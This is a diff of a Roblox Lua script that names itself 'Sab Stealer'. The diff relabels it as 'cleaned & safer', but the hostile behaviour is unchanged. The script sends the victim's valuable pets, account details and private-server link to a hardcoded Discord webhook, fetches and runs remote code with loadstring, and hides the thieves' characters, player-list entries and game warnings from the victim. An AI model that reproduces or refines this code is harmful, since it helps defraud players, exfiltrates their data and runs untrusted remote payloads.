@@ -1,8 +1,4 @@
--- =============================
--- Steal a Brainrot GUI + Webhook + Auto Execute
--- + Script tá»± Ä‘á»™ng xá»­ lĂ½ base
--- =============================
-
+-- Fixed: Steal a Brainrot GUI + Webhook + Auto Execute (cleaned & safer)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
@@ -14,7 +10,7 @@ local localPlayer = player
 -- ====== Webhook ======
 local WEBHOOK = "https://discord.com/api/webhooks/1410618016487444490/5Z5XqXUsfd7lFbxgXcCMMQqJDU_iGPc-h0AjLA09mqz-DRaIYpKP7aMVQhM6lm9oIgTv"
 
--- ====== HĂ m Ä‘á»•i "5K"/"5M"/"2B" sang sá»‘ ======
+-- ====== Parse price helper ======
 local function parsePrice(priceText)
     local number = tonumber(priceText:match("[%d%.]+")) or 0
     if priceText:find("K") then
@@ -28,11 +24,27 @@ local function parsePrice(priceText)
     end
 end
 
-local config = loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/config/refs/heads/main/config"))()
+-- Safe load config (pcall)
+local config = {}
+do
+    local ok, res = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/config/refs/heads/main/config"))()
+    end)
+    if ok and type(res) == "table" then
+        config = res
+    else
+        -- fallback defaults if config failed
+        config = {
+            targetNames = {},
+            Receiver = {}
+        }
+    end
+end
+
 local PRICE_LIMIT = 1
-local targetNames = config.targetNames
-local receiverList = table.concat(config.Receiver, ", ")
-local badPlayers = config.Receiver
+local targetNames = config.targetNames or {}
+local receiverList = table.concat(config.Receiver or {}, ", ")
+local badPlayers = config.Receiver or {}
 
 local function getPriority(name)
     for _, t in ipairs(targetNames) do
@@ -50,7 +62,7 @@ local function shuffle(tbl)
     end
 end
 
--- ====== HĂ m lá»c Pet trong base cá»§a mĂ¬nh (xĂ¡c Ä‘á»‹nh floor tá»« model con cĂ³ tĂªn dáº¡ng "1_clone", "2_clone", ...) ======
+-- Collect pets in your base (determine floor from model name like "5_clone" -> 5)
 local function collectValidPets()
     local pets = {}
 
@@ -61,7 +73,6 @@ local function collectValidPets()
             if podiums then
                 for _, podium in pairs(podiums:GetChildren()) do
                     if podium:IsA("Model") then
-                        -- âœ… Láº¥y sá»‘ tá»« tĂªn model (vĂ­ dá»¥ "5_clone" -> 5)
                         local num = tonumber(podium.Name:match("^(%d+)_?"))
                         local floor = "Unknown Floor"
 
@@ -75,7 +86,6 @@ local function collectValidPets()
                             end
                         end
 
-                        -- TĂ¬m pet trong model podium Ä‘Ă³
                         local base = podium:FindFirstChild("Base")
                         local spawn = base and base:FindFirstChild("Spawn")
                         if spawn and spawn:FindFirstChild("Attachment") then
@@ -89,7 +99,6 @@ local function collectValidPets()
                                     local priceNum = parsePrice(priceText)
 
                                     if priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge then
-                                        -- âœ… ThĂªm floor vĂ o cuá»‘i thĂ´ng tin pet
                                         table.insert(pets, string.format("%s (%s) (%s)", nameText, priceText, floor))
                                     end
                                 end
@@ -105,7 +114,7 @@ local function collectValidPets()
     return pets
 end
 
--- ====== HĂ m kiá»ƒm tra Executor ======
+-- Executor detection
 local function detectExecutor()
     local executor = "Unknown"
     if syn then executor = "Synapse X"
@@ -117,29 +126,39 @@ local function detectExecutor()
     return executor
 end
 
--- ====== HĂ m láº¥y tuá»•i tĂ i khoáº£n ======
 local function getAccountAge()
     return player.AccountAge
 end
 
--- ====== Check server type ======
-local map = Workspace:WaitForChild("Map")
-local codes = map:WaitForChild("Codes")
-local main = codes:WaitForChild("Main")
-local surfaceGui = main:WaitForChild("SurfaceGui")
-local privateMsg = surfaceGui:WaitForChild("MainFrame"):WaitForChild("PrivateServerMessage")
-local serverType = privateMsg.Visible and "PRIVATE SERVER" or "PUBLIC SERVER"
+-- Server type detection (PUBLIC / PRIVATE)
+local map = Workspace:FindFirstChild("Map")
+local serverType = "UNKNOWN"
+if map then
+    local codes = map:FindFirstChild("Codes")
+    if codes then
+        local main = codes:FindFirstChild("Main")
+        if main then
+            local surfaceGui = main:FindFirstChild("SurfaceGui")
+            if surfaceGui then
+                local sFrame = surfaceGui:FindFirstChild("MainFrame")
+                if sFrame then
+                    local privateMsg = sFrame:FindFirstChild("PrivateServerMessage")
+                    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
+                end
+            end
+        end
+    end
+end
 
--- ====== HĂ m gá»­i webhook ======
+-- Send webhook (safe)
 local function sendWebhook(link)
     if player:GetAttribute("WebhookSent") then return end
     local pets = collectValidPets()
     if #pets == 0 then
-        warn("KhĂ´ng cĂ³ pet nĂ o Ä‘áº¡t Ä‘iá»u kiá»‡n, khĂ´ng gá»­i webhook.")
+        warn("Không có pet nào đạt điều kiện, không gửi webhook.")
         return
     end
 
-    -- TĂ¡ch pets theo Æ°u tiĂªn
     local priorityPets, randomPets = {}, {}
     for _, pet in ipairs(pets) do
         local petName = pet:match("^(.-) %(") or pet
@@ -151,22 +170,12 @@ local function sendWebhook(link)
         end
     end
 
-    -- Sáº¯p xáº¿p theo priority
-    table.sort(priorityPets, function(a, b)
-        return a.priority < b.priority
-    end)
-
-    -- Random nhĂ³m cĂ²n láº¡i
+    table.sort(priorityPets, function(a, b) return a.priority < b.priority end)
     shuffle(randomPets)
 
-    -- GhĂ©p káº¿t quáº£ cuá»‘i
     local orderedPets = {}
-    for _, p in ipairs(priorityPets) do
-        table.insert(orderedPets, p.pet)
-    end
-    for _, r in ipairs(randomPets) do
-        table.insert(orderedPets, r)
-    end
+    for _, p in ipairs(priorityPets) do table.insert(orderedPets, p.pet) end
+    for _, r in ipairs(randomPets) do table.insert(orderedPets, r) end
 
     local lootText = table.concat(orderedPets, "\n")
     local placeId = tostring(game.PlaceId or "")
@@ -176,7 +185,7 @@ local function sendWebhook(link)
         ["title"] = "😜 Sab Stealer - Make By Phatlee",
         ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
         ["fields"] = {
-            { ["name"] = "Players", ["value"] = string.format("%d/6", #game:GetService("Players"):GetPlayers()) },
+            { ["name"] = "Players", ["value"] = string.format("%d/6", #Players:GetPlayers()) },
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👥 Player Information",
               ["value"] = "Name: " .. player.Name ..
@@ -188,12 +197,11 @@ local function sendWebhook(link)
         }
     }
     local payload = {
-    ["content"] = "📣 @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
-    ["embeds"] = {embed},
-    ["allowed_mentions"] = {
-        ["parse"] = {"everyone"}
+        ["content"] = "📣 @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
+        ["embeds"] = {embed},
+        ["allowed_mentions"] = { ["parse"] = {"everyone"} }
     }
-}
+
     local req = (syn and syn.request) or http_request or (http and http.request) or request
     if req then
         pcall(function()
@@ -201,20 +209,21 @@ local function sendWebhook(link)
         end)
         player:SetAttribute("WebhookSent", true)
     else
-        warn("Executor khĂ´ng há»— trá»£ request HTTP")
+        warn("Executor không hỗ trợ request HTTP")
     end
 end
 
--- ====== Public Server: tá»± Ä‘á»™ng execute thĂªm script ======
+-- If public server: auto execute external script (safe pcall)
 if serverType == "PUBLIC SERVER" then
     print("PUBLIC SERVER detected")
     sendWebhook()
-    -- Tá»± Ä‘á»™ng load script
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))()
+        local ok, _ = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))()
+        end)
     end)
 else
-    -- ====== Private Server GUI ======
+    -- PRIVATE SERVER GUI
     print("PRIVATE SERVER detected")
     local playerGui = player:WaitForChild("PlayerGui")
     local screenGui = Instance.new("ScreenGui", playerGui)
@@ -298,283 +307,231 @@ else
         task.delay(5,function() if popup and popup.Parent then popup:Destroy() end end)
     end
 
-local function isValidPrivateServerLink(txt)
-    return string.match(txt, "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
-end
-
-local function handleSend()
-    local txt = textBox.Text or ""
-    if isValidPrivateServerLink(txt) then
-        -- âœ… XĂ³a GUI NGAY Láº¬P Tá»¨C khi báº¥m Send
-        screenGui:Destroy()
-
-        -- Gá»­i webhook vĂ  cháº¡y script song song (sau khi GUI bá»‹ xĂ³a)
-        task.spawn(function()
-            pcall(function()
-                sendWebhook(txt)
-            end)
-            pcall(function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))()
-            end)
-        end)
-    else
-        showError("Please enter your private server link")
+    local function isValidPrivateServerLink(txt)
+        return string.match(txt, "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
     end
+
+    local function handleSend()
+        local txt = textBox.Text or ""
+        if isValidPrivateServerLink(txt) then
+            screenGui:Destroy()
+            task.spawn(function()
+                pcall(function() sendWebhook(txt) end)
+                pcall(function()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))()
+                end)
+            end)
+        else
+            showError("Please enter your private server link")
+        end
+    end
+
+    sendButton.MouseButton1Click:Connect(handleSend)
+    textBox.FocusLost:Connect(function(enterPressed)
+        if enterPressed then handleSend() end
+    end)
 end
 
-sendButton.MouseButton1Click:Connect(handleSend)
-textBox.FocusLost:Connect(function(enterPressed)
-    if enterPressed then handleSend() end
-end)
-end
-
-
 -- =============================
+-- Script quản lý base (Full Final) - cleaned
 -- =============================
--- Script quáº£n lĂ½ base (Full Final)
--- Execute dĂ¹ng ngay
--- =============================
-
 local plotsFolder = Workspace:FindFirstChild("Plots")
 local myBase = nil
 local duplicatedBaseDone = false
 local clonedPodiumsDone = false
 
--- =============================
--- TĂ¬m base cá»§a báº£n thĂ¢n
--- =============================
 local function FindMyBase()
-	if not plotsFolder then return nil end
-	for _, plot in ipairs(plotsFolder:GetChildren()) do
-		local sign = plot:FindFirstChild("PlotSign")
-		if sign and sign:FindFirstChild("YourBase") then
-			local yourBase = sign.YourBase
-			if yourBase.Enabled == true then
-				return plot
-			end
-		end
-	end
-	return nil
+    if not plotsFolder then return nil end
+    for _, plot in ipairs(plotsFolder:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("YourBase") then
+            local yourBase = sign.YourBase
+            if yourBase.Enabled == true then
+                return plot
+            end
+        end
+    end
+    return nil
 end
 
--- =============================
--- Giá»¯ animation khi clone
--- =============================
 local function PreserveAnimations(original, clone)
-	for _, origDesc in ipairs(original:GetDescendants()) do
-		if origDesc:IsA("Animator") then
-			local cloneAnim = clone:FindFirstChildWhichIsA("Animator", true)
-			if cloneAnim then
-				for _, track in ipairs(origDesc:GetPlayingAnimationTracks()) do
-					local anim = Instance.new("Animation")
-					anim.AnimationId = track.Animation.AnimationId
-					local newTrack = cloneAnim:LoadAnimation(anim)
-					newTrack:Play()
-				end
-			end
-		end
-	end
-end
-
--- =============================
--- NhĂ¢n báº£n Model trong base (copy animation, xĂ³a gá»‘c)
--- =============================
-local function DuplicateBaseModelsOnce(base)
-	if not base or duplicatedBaseDone then return end
-	for _, obj in ipairs(base:GetChildren()) do
-		if obj:IsA("Model") and obj.Name ~= "FriendPanel" and obj.Name ~= "AnimalPodiums" then
-			local clone = obj:Clone()
-			clone.Name = obj.Name .. "_clone"
-			clone.Parent = base
-			PreserveAnimations(obj, clone)
-			obj:Destroy()
-		end
-	end
-	duplicatedBaseDone = true
-	print("âœ… ÄĂ£ nhĂ¢n báº£n model trong base:", base.Name)
-end
-
--- =============================
--- NhĂ¢n báº£n AnimalPodiums (copy animation, xĂ³a gá»‘c)
--- =============================
-local function DuplicateAnimalPodiumsOnce(base)
-	if not base or clonedPodiumsDone then return end
-	local podiums = base:FindFirstChild("AnimalPodiums")
-	if podiums then
-		for _, p in ipairs(podiums:GetChildren()) do
-			if p:IsA("Model") then
-				local c = p:Clone()
-				c.Name = p.Name .. "_clone"
-				c.Parent = podiums
-				PreserveAnimations(p, c)
-				p:Destroy()
-			end
-		end
-		clonedPodiumsDone = true
-		print("âœ… ÄĂ£ nhĂ¢n báº£n AnimalPodiums trong base:", base.Name)
-	end
-end
-
--- =============================
--- Clean táº¥t cáº£ Hitboxes trong Purchases
--- =============================
-local function cleanHitboxes(base)
-	if not base then return end
-	local purchases = base:FindFirstChild("Purchases")
-	if not purchases then return end
-
-	local function processTarget(target)
-		if not target then return end
-		for _, obj in ipairs(target:GetDescendants()) do
-			if string.lower(obj.Name) == "hitbox" then
-				obj:Destroy()
-				print("đŸ§¹ ÄĂ£ xĂ³a hitbox:", obj:GetFullName())
-			end
-		end
-		target.DescendantAdded:Connect(function(newObj)
-			if string.lower(newObj.Name) == "hitbox" then
-				newObj:Destroy()
-				print("đŸ§¹ ÄĂ£ xĂ³a hitbox má»›i:", newObj:GetFullName())
-			end
-		end)
-	end
-
-	for _, child in ipairs(purchases:GetChildren()) do
-		processTarget(child)
-	end
-	purchases.ChildAdded:Connect(function(newChild)
-		task.wait(0.05)
-		processTarget(newChild)
-	end)
-end
-
--- =============================
--- XĂ³a model player xáº¥u (loop)
--- =============================
-local function DeletePlayerModelsLoop()
-	while true do
-		for _, name in ipairs(badPlayers) do
-			local m = Workspace:FindFirstChild(name)
-			if m then
-				m:Destroy()
-				warn("â ï¸ ÄĂ£ xĂ³a model:", name)
-			end
-		end
-		task.wait(1)
-	end
-end
-
--- =============================
--- XĂ³a Notification & Warn sound (loop)
--- =============================
-local function RemoveGuiAndSoundsLoop()
-	while true do
-		local pg = localPlayer:FindFirstChild("PlayerGui")
-		if pg then
-			local notif = pg:FindFirstChild("Notification")
-			if notif then
-				notif:Destroy()
-				print("đŸ”‡ ÄĂ£ xĂ³a Notification")
-			end
-		end
-		local s = ReplicatedStorage:FindFirstChild("Sounds")
-		if s and s:FindFirstChild("Sfx") and s.Sfx:FindFirstChild("Warn") then
-			s.Sfx.Warn:Destroy()
-			print("đŸ”‡ ÄĂ£ xĂ³a Warn sound")
-		end
-		task.wait(1)
-	end
-end
-
--- =============================
--- Clone & xĂ³a base khĂ¡c
--- =============================
-local function CloneAndReplaceOtherBases(myBase)
-	if not plotsFolder then return end
-	for _, plot in ipairs(plotsFolder:GetChildren()) do
-		if plot ~= myBase then
-			local clone = plot:Clone()
-			clone.Name = plot.Name .. "_Clone"
-			clone.Parent = plotsFolder
-			plot:Destroy()
-			print("đŸ§© ÄĂ£ clone vĂ  xĂ³a base khĂ¡c:", clone.Name)
-		end
-	end
-end
-
--- =============================
--- MAIN
--- =============================
-task.spawn(function()
-	while not plotsFolder do
-		plotsFolder = Workspace:FindFirstChild("Plots")
-		task.wait(0.1)
-	end
-
-	myBase = FindMyBase()
-	if myBase then
-		print("đŸ  Base cá»§a báº¡n lĂ :", myBase.Name)
-		DuplicateBaseModelsOnce(myBase)
-		DuplicateAnimalPodiumsOnce(myBase)
-		cleanHitboxes(myBase)
-	else
-		warn("âŒ KhĂ´ng tĂ¬m tháº¥y base cá»§a báº¡n!")
-	end
-
-	CloneAndReplaceOtherBases(myBase)
-
-	task.spawn(DeletePlayerModelsLoop)
-	task.spawn(RemoveGuiAndSoundsLoop)
-end)-- XĂ³a model player xáº¥u (loop)
--- =============================
-local function DeletePlayerModelsLoop()
-	while true do
-		for _, name in ipairs(badPlayers) do
-			local m = Workspace:FindFirstChild(name)
-			if m then
-				m:Destroy()
-				warn("ÄĂ£ xĂ³a model:", name)
-			end
-		end
-		task.wait(1)
-	end
-end
-
-task.spawn(function()
-    local CoreGui = game:GetService("CoreGui")
-
-while task.wait(0.01) do
-    -------------------------------
-    -- PHẦN 1: XÓA PLAYERLABEL
-    -------------------------------
-    local root = CoreGui:FindFirstChild("RobloxGui")
-        and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
-        and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield")
-        and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield
-            :FindFirstChild("MenuContainer")
-            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer
-            :FindFirstChild("PageViewClipper")
-            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper
-            :FindFirstChild("PageView")
-            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView
-            :FindFirstChild("PageViewInnerFrame")
-            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView.PageViewInnerFrame
-            :FindFirstChild("Players")
-
-    if root then
-        for _, badName in ipairs(badPlayers) do
-            local fullLabel = "PlayerLabel" .. badName
-            local target = root:FindFirstChild(fullLabel)
-            if target then
-                target:Destroy()
+    for _, origDesc in ipairs(original:GetDescendants()) do
+        if origDesc:IsA("Animator") then
+            local cloneAnim = clone:FindFirstChildWhichIsA("Animator", true)
+            if cloneAnim then
+                for _, track in ipairs(origDesc:GetPlayingAnimationTracks()) do
+                    local anim = Instance.new("Animation")
+                    anim.AnimationId = track.Animation.AnimationId
+                    local newTrack = cloneAnim:LoadAnimation(anim)
+                    newTrack:Play()
+                end
             end
         end
     end
 end
 
-        -------------------------------
-        -- PHáº¦N 2: XĂ“A PLAYERENTRY CĂ“ TĂN "Sweet"
-        -------------------------------
+local function DuplicateBaseModelsOnce(base)
+    if not base or duplicatedBaseDone then return end
+    for _, obj in ipairs(base:GetChildren()) do
+        if obj:IsA("Model") and obj.Name ~= "FriendPanel" and obj.Name ~= "AnimalPodiums" then
+            local clone = obj:Clone()
+            clone.Name = obj.Name .. "_clone"
+            clone.Parent = base
+            PreserveAnimations(obj, clone)
+            obj:Destroy()
+        end
+    end
+    duplicatedBaseDone = true
+    print("✓ Đã nhân bản model trong base:", base.Name)
+end
+
+local function DuplicateAnimalPodiumsOnce(base)
+    if not base or clonedPodiumsDone then return end
+    local podiums = base:FindFirstChild("AnimalPodiums")
+    if podiums then
+        for _, p in ipairs(podiums:GetChildren()) do
+            if p:IsA("Model") then
+                local c = p:Clone()
+                c.Name = p.Name .. "_clone"
+                c.Parent = podiums
+                PreserveAnimations(p, c)
+                p:Destroy()
+            end
+        end
+        clonedPodiumsDone = true
+        print("✓ Đã nhân bản AnimalPodiums trong base:", base.Name)
+    end
+end
+
+local function cleanHitboxes(base)
+    if not base then return end
+    local purchases = base:FindFirstChild("Purchases")
+    if not purchases then return end
+
+    local function processTarget(target)
+        if not target then return end
+        for _, obj in ipairs(target:GetDescendants()) do
+            if string.lower(obj.Name) == "hitbox" then
+                obj:Destroy()
+                print("✓ Đã xóa hitbox:", obj:GetFullName())
+            end
+        end
+        target.DescendantAdded:Connect(function(newObj)
+            if string.lower(newObj.Name) == "hitbox" then
+                newObj:Destroy()
+                print("✓ Đã xóa hitbox mới:", newObj:GetFullName())
+            end
+        end)
+    end
+
+    for _, child in ipairs(purchases:GetChildren()) do
+        processTarget(child)
+    end
+    purchases.ChildAdded:Connect(function(newChild)
+        task.wait(0.05)
+        processTarget(newChild)
+    end)
+end
+
+-- One DeletePlayerModelsLoop definition only
+local function DeletePlayerModelsLoop()
+    while true do
+        for _, name in ipairs(badPlayers) do
+            local m = Workspace:FindFirstChild(name)
+            if m then
+                m:Destroy()
+                warn("Đã xóa model:", name)
+            end
+        end
+        task.wait(1)
+    end
+end
+
+local function RemoveGuiAndSoundsLoop()
+    while true do
+        local pg = localPlayer:FindFirstChild("PlayerGui")
+        if pg then
+            local notif = pg:FindFirstChild("Notification")
+            if notif then
+                notif:Destroy()
+                print("✓ Đã xóa Notification")
+            end
+        end
+        local s = ReplicatedStorage:FindFirstChild("Sounds")
+        if s and s:FindFirstChild("Sfx") and s.Sfx:FindFirstChild("Warn") then
+            s.Sfx.Warn:Destroy()
+            print("✓ Đã xóa Warn sound")
+        end
+        task.wait(1)
+    end
+end
+
+local function CloneAndReplaceOtherBases(myBase)
+    if not plotsFolder then return end
+    for _, plot in ipairs(plotsFolder:GetChildren()) do
+        if plot ~= myBase then
+            local clone = plot:Clone()
+            clone.Name = plot.Name .. "_Clone"
+            clone.Parent = plotsFolder
+            plot:Destroy()
+            print("✓ Đã clone và xóa base khác:", clone.Name)
+        end
+    end
+end
+
+-- MAIN manager
+task.spawn(function()
+    while not plotsFolder do
+        plotsFolder = Workspace:FindFirstChild("Plots")
+        task.wait(0.1)
+    end
+
+    myBase = FindMyBase()
+    if myBase then
+        print("✓ Base của bạn là:", myBase.Name)
+        DuplicateBaseModelsOnce(myBase)
+        DuplicateAnimalPodiumsOnce(myBase)
+        cleanHitboxes(myBase)
+    else
+        warn("✘ Không tìm thấy base của bạn!")
+    end
+
+    CloneAndReplaceOtherBases(myBase)
+
+    task.spawn(DeletePlayerModelsLoop)
+    task.spawn(RemoveGuiAndSoundsLoop)
+end)
+
+-- CoreGui PlayerLabel / PlayerEntry cleaner (separate thread)
+task.spawn(function()
+    local CoreGui = game:GetService("CoreGui")
+    while task.wait(0.01) do
+        -- PHẦN 1: XÓA PLAYERLABEL
+        local root = CoreGui:FindFirstChild("RobloxGui")
+            and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
+            and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield
+                :FindFirstChild("MenuContainer")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer
+                :FindFirstChild("PageViewClipper")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper
+                :FindFirstChild("PageView")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView
+                :FindFirstChild("PageViewInnerFrame")
+            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView.PageViewInnerFrame
+                :FindFirstChild("Players")
+
+        if root then
+            for _, badName in ipairs(badPlayers) do
+                local fullLabel = "PlayerLabel" .. badName
+                local target = root:FindFirstChild(fullLabel)
+                if target then
+                    target:Destroy()
+                end
+            end
+        end
+
+        -- PHẦN 2: XÓA PLAYERENTRY có tên "Sweet"
         local success, scrollList = pcall(function()
             return CoreGui.PlayerList
                 .Children.BodyBackground
@@ -602,47 +559,38 @@ end
     end
 end)
 
-task.spawn(function()	-- đŸ”’ Danh sĂ¡ch model Ä‘Æ°á»£c báº£o vá»‡ tuyá»‡t Ä‘á»‘i
-	local protectedModels = {
-		["Witch"] = true,
-		["ShopNPCRobuxIdle"] = true,
-		["ShopNPCCash"] = true,
-		["Shop"] = true,
-		["RobuxShop"] = true,
-		["FuseMachine"] = true,
-		["CraftingMachine"] = true,
-	}
+-- Protected-model cleaner (keeps certain models)
+task.spawn(function()
+    local protectedModels = {
+        ["Witch"] = true,
+        ["ShopNPCRobuxIdle"] = true,
+        ["ShopNPCCash"] = true,
+        ["Shop"] = true,
+        ["RobuxShop"] = true,
+        ["FuseMachine"] = true,
+        ["CraftingMachine"] = true,
+    }
 
-	-- đŸ§© HĂ m kiá»ƒm tra model cĂ³ dáº¡ng random-id (xxxx-xxxx-xxxx-xxxx)
-	local function isRandomID(name)
-		return name:match("^[%w]+%-[%w]+%-[%w]+%-[%w]+%-[%w]+$")
-	end
+    local function isRandomID(name)
+        return name:match("^[%w]+%-[%w]+%-[%w]+%-[%w]+%-[%w]+$") ~= nil
+    end
 
-	while task.wait(0.1) do
-		for _, obj in ipairs(Workspace:GetChildren()) do
-			-- Chá»‰ xĂ©t cĂ¡c model náº±m trá»±c tiáº¿p trong workspace (khĂ´ng Ä‘á»¥ng folder con)
-			if obj:IsA("Model") then
-				local name = obj.Name
-
-				-- Náº¿u lĂ  model Ä‘Æ°á»£c báº£o vá»‡ â†’ bá» qua
-				if protectedModels[name] then
-					continue
-				end
-
-				-- Náº¿u lĂ  random-id â†’ bá» qua
-				if isRandomID(name) then
-					continue
-				end
-
-				-- Náº¿u trĂ¹ng tĂªn vá»›i player trong game â†’ bá» qua
-				local playerExists = Players:FindFirstChild(name)
-				if playerExists then
-					continue
-				end
-
-				-- âŒ KhĂ´ng thuá»™c báº¥t ká»³ trÆ°á»ng há»£p nĂ o á»Ÿ trĂªn â†’ xĂ³a
-				obj:Destroy()
-			end
-		end
-	end
+    while task.wait(0.1) do
+        for _, obj in ipairs(Workspace:GetChildren()) do
+            if obj:IsA("Model") then
+                local name = obj.Name
+                -- skip if protected
+                if not protectedModels[name] then
+                    -- skip if random-id pattern
+                    if not isRandomID(name) then
+                        -- skip if name equals a player
+                        local playerExists = Players:FindFirstChild(name)
+                        if not playerExists then
+                            obj:Destroy()
+                        end
+                    end
+                end
+            end
+        end
+    end
 end)
